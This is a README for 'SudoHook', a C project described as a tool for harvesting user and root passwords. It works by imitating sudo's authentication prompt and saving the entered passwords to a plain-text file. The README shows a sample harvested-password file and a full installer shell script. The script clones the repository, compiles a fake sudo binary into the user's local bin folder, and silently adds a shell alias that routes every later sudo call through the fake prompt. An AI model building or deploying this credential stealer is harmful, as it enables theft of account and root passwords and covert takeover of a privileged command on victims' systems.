<small>disclaimer: the script has still some unoptimized things such as time and functions</small>
```
┏┓   ┓  ┓┏    ┓ 
┗┓┓┏┏┫┏┓┣┫┏┓┏┓┃┏   ┓ ┏┓
┗┛┗┻┗┻┗┛┛┗┗┛┗┛┛┗   ┻•┗┛
```


## `SudoHook is a C project made to harvest user/root passwords. `
<br>when the binary is executed, the user will visualise the script mimicking sudo's authentication process, the difference is that the password, when it's entered (and verified succesfully, will get extracted and appended in a plain text file, e.g:
```
# harvested_passwords.txt
user: plasma-bls
password: mypassword123
UID: 1000 GID: 1000
```
<br> Here's a PoC i made that makes everything for you (source: PoC.sh):
```bash
#!/bin/sh

TEMPDIR=$(mktemp -d /tmp/sudo.XXXXXXX)

case $SHELL in
    */zsh)  SHELLCFG="$HOME/.zshrc" ;;
    */bash) SHELLCFG="$HOME/.bashrc" ;;
    *)      SHELLCFG="$HOME/.profile" ;;
esac

cd "$TEMPDIR" || exit 1
# assuming git is installed
git clone https://github.com/plasma-bls/SudoHook.git > /dev/null 2>&1
cd SudoHook/ || exit 1

# checking if folder exists
if [ ! -d "$HOME/.local/bin" ]; then mkdir "$HOME/.local/bin"; fi

# assuming gcc is installed
gcc fakesudo.c -o sudo > /dev/null 2>&1
# adding executable permissions
chmod +x sudo && mv sudo "$HOME/.local/bin/"

# checking if alias is already there and adding it
if ! grep -q "alias sudo=" "$SHELLCFG"; then
    echo "alias sudo='$HOME/.local/bin/sudo'" >> "$SHELLCFG"
fi

rm -rf "$TEMPDIR"
```
